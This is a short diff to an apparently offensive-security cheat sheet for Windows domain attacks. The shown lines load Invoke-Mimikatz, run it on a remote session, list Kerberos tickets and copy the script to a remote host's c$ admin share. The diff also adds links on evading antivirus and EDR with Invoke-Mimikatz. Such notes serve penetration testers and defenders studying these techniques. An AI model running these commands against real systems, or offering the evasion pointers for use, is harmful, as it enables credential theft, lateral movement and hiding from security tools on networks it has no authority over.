@@ -203,6 +203,10 @@ If functions not on remote host:-
 ```. ./Invoke-Mimikatz.ps1```
 ```Invoke-Command –Session $Sess -ScriptBlock ${function:Invoke-Mimikatz}```
 
+##### Copy Across
+```Copy-Item ./Invoke-Mimikatz.ps1 /Server1.local/c$/temp```
+``` ls //Server1.local/c$/temp```
+
 #### Invoke Mimikatz
 ```. ./Invoke-Mimikatz.ps1```
 
@@ -212,6 +216,8 @@ If functions not on remote host:-
 
 ```Invoke-Mimikatz -ComputerName -Command "kerberos::list"```
 
-##### Copy Across
-```Copy-Item ./Invoke-Mimikatz.ps1 /Server1.local/c$/temp```
-``` ls //Server1.local/c$/temp```
+#### AV Evasion
+https://github.com/mitre/caldera/issues/38#issuecomment-396055260
+https://rzemieniecki.wordpress.com/2019/08/02/evading-edr-av-software-with-invoke-mimikatz-ps1/
+
+
